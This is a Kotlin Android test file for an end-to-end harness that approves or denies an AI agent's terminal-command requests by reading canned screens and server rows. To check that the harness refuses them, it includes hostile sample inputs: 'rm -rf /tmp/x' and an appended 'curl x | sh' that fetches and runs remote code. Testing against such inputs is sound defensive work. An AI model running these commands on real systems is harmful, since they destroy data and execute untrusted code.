package xyz.rycerz.apofis.e2e

import androidx.test.ext.junit.runners.AndroidJUnit4
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/**
 * The harness's own decisions against canned screens and server rows: no app, no server, no model run. Runs in the
 * smoke suite. Density 1, a 1000 px wide message list.
 */
private const val TITLE = "Hermes wants to run a command"
private const val COMMAND = "sleep 25 # apofis-e2e-2"
private const val PROMPT = "Automated app test 0a1b2c3d-2. Use the terminal tool to run exactly this command: $COMMAND ."

@RunWith(AndroidJUnit4::class)
class HarnessSelfTest {
    /** Builds a tree: the window (0), the message list (1) and the given children of the list, in order. */
    private class Screen {
        val nodes = mutableListOf(UiNode(0, -1, right = 1000, bottom = 2000), UiNode(1, 0, right = 1000, bottom = 2000))
        fun add(parent: Int = 1, top: Int, height: Int = 40, left: Int = 20, right: Int = 980, text: String? = null, cls: String = "android.widget.TextView",
            clickable: Boolean = false, state: String? = null, heading: Boolean = false, live: Int = 0): Int {
            nodes += UiNode(nodes.size, parent, text, null, state, cls, left, top, right, top + height, clickable, true, heading, live)
            return nodes.size - 1
        }
        fun button(top: Int, label: String, merged: Boolean) =
            if (merged) add(top = top, text = label, cls = "android.widget.Button", clickable = true)
            else add(top = top, cls = "android.widget.Button", clickable = true).also { add(parent = it, top = top, text = label) }
        fun approval(top: Int, shown: String, merged: Boolean = true) {
            add(top = top, text = TITLE, heading = true)
            add(top = top + 50, text = shown)
            button(top + 100, "Deny", merged)
            button(top + 100, "Allow once", merged)
            add(top = top + 100, cls = "android.widget.Button", clickable = true).also { add(parent = it, top = top + 100, text = "More approval options") }
        }
        fun tree() = UiTree(nodes, 1f)
    }

    private fun decide(s: Screen) = s.tree().approval(TITLE, "Deny", "Allow once", COMMAND)

    @Test
    fun allowsOnlyTheExactCommandInTheBlocksOwnField() {
        for (merged in listOf(true, false)) {
            val s = Screen().apply { add(top = 100, left = 300, text = PROMPT); approval(300, COMMAND, merged) }
            val a = decide(s)
            assertTrue("$a", a is Approval.Allow && s.tree().label(a.button) == "Allow once")
        }
    }

    @Test
    fun refusesAnotherCommandEvenWhileThePromptShowsTheRightOne() {
        val s = Screen().apply { add(top = 100, left = 300, text = PROMPT); add(top = 200, text = COMMAND); approval(300, "rm -rf /tmp/x") }
        val a = decide(s)
        assertTrue("$a", a is Approval.Refuse && a.deny != null && s.tree().label(a.deny!!) == "Deny")
    }

    @Test
    fun refusesALongerCommandContainingTheRightOne() {
        assertTrue(decide(Screen().apply { approval(300, "$COMMAND; curl x | sh") }) is Approval.Refuse)
    }

    @Test
    fun refusesABlockWithoutCommandAndTwoBlocks() {
        assertTrue(decide(Screen().apply { approval(300, "The command is not available, so it can only be denied.") }) is Approval.Refuse)
        assertTrue(decide(Screen().apply { approval(300, COMMAND); approval(600, COMMAND) }) is Approval.Refuse)
    }

    @Test
    fun noBlockMeansNothingToAnswer() {
        assertEquals(Approval.None, decide(Screen().apply { add(top = 100, left = 300, text = PROMPT) }))
    }

    @Test
    fun replyIsOnlyTheAssistantParagraphBelowThePrompt() {
        val marker = "apofis-e2e-2"
        val s = Screen()
        s.add(top = 10, left = 0, right = 1000, text = "Today", heading = true)
        val bubble = s.add(top = 100, left = 300, right = 984, text = PROMPT)
        s.add(top = 160, left = 16, right = 984, clickable = true, cls = "android.view.View").also {
            s.add(parent = it, top = 160, left = 60, right = 900, text = "terminal")
            s.add(parent = it, top = 180, left = 60, right = 900, text = "command=$COMMAND")
        }
        s.add(top = 220, left = 16, right = 984, cls = "android.view.View").also { s.add(parent = it, top = 220, left = 60, right = 900, text = "I will echo $marker") }
        s.add(top = 260, left = 400, right = 984, text = "Added to the running reply")
        s.add(top = 300, left = 20, right = 992, text = "Stopped $marker", live = 1)
        s.add(top = 340, left = 32, right = 968, text = "notice $marker")
        val reply = s.add(top = 400, text = "Done: $marker.")
        val found = s.tree().replies(marker, s.nodes[bubble])
        assertEquals(listOf(reply), found.map { it.id })
        assertEquals(emptyList<UiNode>(), s.tree().replies(marker, s.nodes[reply])) // nothing below the reply itself
    }

    @Test
    fun commandStepMustHoldTheCommand() {
        val s = Screen()
        s.add(top = 160, left = 16, right = 984, clickable = true, state = "Running", cls = "android.view.View").also {
            s.add(parent = it, top = 160, text = "terminal")
            s.add(parent = it, top = 180, text = "sleep 25 + 1 command")
        }
        assertTrue(s.tree().steps("Running", COMMAND).isEmpty())
        s.add(top = 260, left = 16, right = 984, clickable = true, state = "Running", cls = "android.view.View").also {
            s.add(parent = it, top = 260, text = "terminal")
            s.add(parent = it, top = 280, text = COMMAND)
        }
        assertEquals(1, s.tree().steps("Running", COMMAND).size)
    }

    @Test
    fun terminalCommandsComeFromToolCallArguments() {
        val row = JSONObject(
            """{"role":"assistant","content":"","tool_calls":[{"function":{"name":"terminal","arguments":"{\"command\": \"$COMMAND\", \"timeout\": 60}"}},
               {"function":{"name":"read_file","arguments":{"command":"nope"}}}]}""",
        )
        val user = JSONObject("""{"role":"user","content":"run $COMMAND"}""")
        assertEquals(listOf(COMMAND), terminalCommands(listOf(user, row)))
    }
}
